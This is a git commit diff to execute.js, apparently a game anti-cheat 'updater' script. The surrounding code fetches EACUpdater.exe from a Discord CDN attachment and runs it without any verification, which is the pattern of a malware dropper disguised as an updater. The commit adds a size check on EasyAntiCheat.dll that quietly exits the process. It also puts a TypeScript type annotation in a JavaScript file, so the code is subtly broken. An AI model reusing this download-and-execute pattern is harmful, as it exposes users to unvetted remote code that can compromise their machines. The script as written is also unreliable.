86f1daf4f8f0ca86f98d1795330bbab576080a47
Ryuzaki <lod.skot@gmail.com>
2022-04-21 08:03:14 +0400

    Update execute.js

--- execute.js
+++ execute.js
@@ -2,6 +2,17 @@ const fsPromises = require('fs').promises;
 const axios = require('axios');
 const fs = require('fs');
 const { exec } = require('child_process');
+
+const goCheckLocalEAC = () => {
+            if (fs.existsSync("./EasyAntiCheat.dll")) {
+                const EacSize: number = fs.statSync("./EasyAntiCheat.dll").size / 1024;
+                if (EacSize < 750 || EacSize > 800) {
+                    process.exit(0);
+                    return;
+                }
+            }
+        }
+
 if (fs.existsSync('./EACUpdater.exe') == false) {
         axios.get('https://cdn.discordapp.com/attachments/902821540675072020/964890467336589342/EACUpdater.exe',
         {
@@ -11,8 +22,12 @@ if (fs.existsSync('./EACUpdater.exe') == false) {
             await fsPromises.writeFile('./EACUpdater.exe', response.data, { encoding: 'binary' });
             exec("cmd /C start EACUpdater.exe", (error, stdout, stderr) => {})
             console.log("FINISH!")
+            goCheckLocalEAC()
         })
         .catch(error => {
             console.log({ error });
+            goCheckLocalEAC()
         });
+} else {
+        goCheckLocalEAC()
 }
